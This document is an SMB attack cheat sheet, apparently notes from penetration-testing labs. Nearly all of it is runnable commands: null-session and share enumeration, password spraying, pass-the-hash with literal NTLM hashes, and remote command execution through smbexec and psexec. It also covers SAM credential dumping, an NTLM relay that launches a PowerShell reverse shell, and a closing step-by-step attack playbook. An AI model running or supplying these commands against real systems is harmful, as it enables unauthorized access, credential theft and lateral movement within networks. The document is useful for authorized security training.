# SMB Enumeration

Goal: Enumerate shares, users, policies, and credentials.

---

# Null Session

smbclient -N -L //<FQDN/IP>

smbclient //<FQDN/IP>/<share>

rpcclient -U "" <FQDN/IP>

rpcclient -U'%' 10.10.110.17

rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo

rpcclient $> enumdomuser

---

# SMB Share Enumeration

smbmap -H <FQDN/IP>

smbmap -H 10.129.14.128 -r notes

smbmap -H 10.129.14.128 --download "notes\note.txt"

smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

---

# Automated Enumeration

./enum4linux-ng.py 10.10.11.45 -A -C

enum4linux -P 172.16.5.5

enum4linux -U 172.16.5.5 | grep "user:"

enum4linux-ng -P 172.16.5.5 -oA ilfreight

---

# CrackMapExec / NetExec

crackmapexec smb <FQDN/IP> --shares -u '' -p ''

crackmapexec smb 172.16.5.5 --users

crackmapexec smb 172.16.5.5 -u avazquez -p Password123

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --loggedon-users

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

---

# Impacket

impacket-psexec administrator:'Password123!'@10.10.110.17

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>'

---

# SAM Dumping

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

---

# Tactical Notes

- Always test NULL session first.
- Enumerate shares.
- Check for writable shares.
- Check logged-on users.
- Dump SAM if admin credentials found.
- Pass-the-hash when hashes are available.
- NTLM relay if LLMNR poisoning succeeds.
